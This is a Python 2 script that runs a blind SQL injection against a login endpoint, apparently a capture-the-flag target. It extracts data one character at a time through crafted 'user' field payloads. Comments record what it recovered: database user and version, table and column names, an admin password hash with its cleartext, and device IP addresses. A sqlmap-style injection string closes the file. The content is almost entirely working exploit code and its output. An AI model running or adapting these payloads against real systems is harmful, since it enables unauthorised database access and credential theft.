import requests
import re
from StringIO import StringIO
from pycurl import *
import os


url = "http://127.0.0.1:5000/login"
payload = {
    "user":"",
    "pass":"xxxx",
    "cmd":"getTemp"
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6A MIUI/V9.6.18.0.OCBMIFD)", 
    "Connection": "close", 
    "Accept-Encoding": "gzip, deflate"
}


def check(data):
    print data.elapsed.total_seconds()
    if data.elapsed.total_seconds() > 1:
        return False
    else:
        return True

def check2(data):
    # print data.text
    return re.search("Invalid username or password", data.text)

def blind(kolom,table):
    passwd = ""
    idx = 1

    while (True):
        lo = 1
        hi = 255
        temp = -1
        while(lo <= hi):
            mid = (lo + hi) / 2         
            # payload["user"] = "' or (SELECT CASE when (ascii(substr({},{},1)) <= {}) THEN 1 ELSE sleep(1) END {}) or '".format(str(kolom),str(idx),str(mid),str(table))
            payload["user"] = "' or (SELECT CASE when (select ascii(substr({},{},1)) {}) <= {} THEN (select 1) ELSE (select 1 union select 2) END) or '".format(str(kolom),str(idx),str(table),str(mid))
            # payload["user"] = "' or (select if(true, (select 1), (select 1 union select 2))) or '"
            res = requests.post(url,data=payload, headers=headers)
            # print payload["user"]
            if check2(res):
               hi = mid-1
               temp = mid
            else:
               lo = mid+1

        if (hi == 0): break
        passwd += chr(temp)
        res = ""
        print "Result [{}]: {}".format(table,passwd)
        idx += 1

    return passwd



# blind("user()","")
# Result []: root@localhost

# blind("@@version","")
# Result []: 10.1.37-MariaDB-0+deb9u1

# blind("database()","")
# Result []: flitebackend

# blind("schema()","")
# Result []: flitebackend

# blind("table_name","from information_schema.tables where table_name!='devices'")
# blind("table_name","from information_schema.tables where table_schema=schema()")
# Result [from information_schema.tables where table_schema=schema()]: devices
# Result [from information_schema.tables where table_name!='devices']: users

# blind("column_name","from information_schema.columns where table_name='devices'")
# blind("column_name","from information_schema.columns where table_name='devices' and column_name!='id'")
# blind("column_name","from information_schema.columns where table_name='devices' and column_name not in ('id','ip')")
# id, ip

# blind("column_name","from information_schema.columns where table_name='users' and column_name not in ('id')")
# blind("column_name","from information_schema.columns where table_name='users' and column_name not in ('id','username')")
# blind("column_name","from information_schema.columns where table_name='users' and column_name not in ('id','username','password')")
# blind("column_name","from information_schema.columns where table_name='users' and column_name not in ('id','username','password','USER')")
# id, username, password, USER

# blind("password","from users where username='admin'")
# 1, admin, 5f4dcc3b5aa765d61d8327deb882cf99 (password)
# 

blind("group_concat(ip)","from devices")
# 1, 10.176.194.225
# 2, 244.181.238.206
# 3, 243.221.130.19


# x' AND 6492=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(ip AS CHAR),0x20) 
# FROM flitebackend.devices ORDER BY id LIMIT 2,1),6,1))>87) THEN 6492 ELSE 
# (SELECT 4509 UNION SELECT 4483) END))-- Ysdo